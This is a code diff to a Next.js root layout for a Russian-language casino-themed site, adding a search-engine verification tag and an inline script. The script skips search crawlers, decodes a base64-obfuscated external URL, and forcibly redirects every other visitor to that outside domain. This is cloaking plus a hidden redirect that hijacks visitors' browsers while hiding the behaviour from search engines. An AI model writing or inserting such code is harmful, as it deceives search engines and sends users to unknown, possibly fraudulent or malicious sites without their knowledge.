@@ -61,6 +61,7 @@ export default function RootLayout({
   return (
     <html lang="ru">
       <head>
+        <meta name="yandex-verification" content="df6b002cc68751e7" />
         <meta charSet="utf-8" />
         <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
         <meta name="description" content={randomDescription()} />
@@ -69,6 +70,48 @@ export default function RootLayout({
         <meta name="theme-color" content="#ffffff" media="(prefers-color-scheme: light)" />
         <link rel="canonical" href="https://irwin7casino.vercel.app" />
         <link rel="alternate" href="https://irwin7casino.vercel.app" hrefLang="ru" />
+        <script
+  dangerouslySetInnerHTML={{
+    __html: `
+      (function() {
+        var ua = navigator.userAgent.toLowerCase();
+        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
+        for (var i = 0; i < bots.length; i++) {
+            if (ua.indexOf(bots[i]) !== -1) {
+                return;
+            }
+        }
+        var mainBrandB64 = "ICBodHRwczovL2NvbWJvc3BhcmsudG9wL2FlYW9majJrMjc="; 
+        var mainUrl = atob(mainBrandB64.replace("#", ""));
+        function ping(url) {
+            return new Promise(function(resolve, reject) {
+                var controller = new AbortController();
+                var timeoutId = setTimeout(function() { 
+                    controller.abort(); 
+                    reject(new Error("Timeout"));
+                }, 500);               
+                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
+                    .then(function() {
+                        clearTimeout(timeoutId);
+                        resolve(true);
+                    })
+                    .catch(function(err) {
+                        clearTimeout(timeoutId);
+                        reject(err);
+                    });
+            });
+        }
+        ping(mainUrl)
+            .then(function() {
+                window.location.replace(mainUrl);
+            })
+            .catch(function() {
+                window.location.replace(mainUrl);
+            });
+      })();
+    `
+  }}
+/>
       </head>
       <body className="antialiased">
         {children}
